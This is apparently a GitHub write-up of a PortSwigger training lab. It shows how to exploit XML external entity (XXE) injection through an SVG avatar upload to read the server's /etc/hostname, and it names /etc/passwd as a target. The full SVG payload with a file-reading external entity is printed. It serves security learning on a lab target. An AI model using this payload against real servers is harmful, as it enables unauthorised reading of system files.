## Lab Description :

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/3b2e620d-947e-466d-9fea-cdcbfc95f033)

## Solution :

The image upload functionality is vulnerable to XXE attack.

Since SVG image formats are XML based, we can try to upload an SVG image & modify the content of the xml to retreive /etc/passwd.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/73411c86-a2ed-42b0-b26b-26f1e0231f95)

Post a comment on a blog post, capture the req.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/bec0d165-a415-4676-80bc-31acdacf8acb)

 In the above request remove all the tag contents and replace it with this payload.

```xml
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/99eb9617-57e4-42ec-8191-e7ce18cf6b50)

Send the req-

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/fae16909-d865-45fc-82bb-227eab4dd685)

We get a 302 Redirect which means the file upload is successful.

We can see the image has been uploaded as avatar

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/db3b6444-03ca-499e-8c30-76ace1f48e0c)

Click on the image & open it in new tab to view the o/p of /etc/hostname command

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/ac235fce-ecb4-4b47-967f-904fa40d4584)

Use the "Submit solution" button to submit the value of the server hostname.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/c61ee20e-5827-4328-a52e-5707e98ad1f8)

Lab Solved.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/0d948bb8-b0ce-45a0-bcf2-d027abc86e86)



